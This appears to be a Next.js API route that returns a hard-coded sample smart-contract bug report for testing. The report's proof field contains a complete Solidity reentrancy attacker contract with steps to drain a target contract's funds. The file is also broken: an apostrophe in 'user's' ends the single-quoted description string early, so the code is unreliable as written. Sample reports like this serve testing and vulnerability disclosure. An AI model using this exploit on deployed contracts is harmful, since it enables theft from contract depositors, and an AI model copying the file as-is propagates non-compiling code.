import type { NextApiRequest, NextApiResponse } from 'next';

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === 'GET') {
    // Return a sample bug report for testing
    return res.status(200).json([
      {
        id: 1,
        contractAddress: '0x1234567890abcdef1234567890abcdef12345678',
        severity: 'high',
        description: 'Reentrancy vulnerability in the withdraw() function. The contract allows external calls before updating the user's balance, enabling an attacker to recursively withdraw funds.',
        proof: `1. Deploy the contract and deposit 1 ETH.\n2. Deploy the following attacker contract:\n\n\`\`\`solidity\ncontract Attacker {\n    DeadDrop target;\n    constructor(address _target) { target = DeadDrop(_target); }\n    function attack() public payable {\n        target.deposit{value: msg.value}();\n        target.withdraw();\n    }\n    receive() external payable {\n        if (address(target).balance > 0) {\n            target.withdraw();\n        }\n    }\n}\n\`\`\`\n\n3. Call \`attack()\` with 1 ETH. The attacker will drain the contract.`,
        timestamp: new Date().toISOString(),
        digest: '0xabc123...def456'
      }
    ]);
  }
  res.status(405).json({ error: 'Method not allowed' });
} 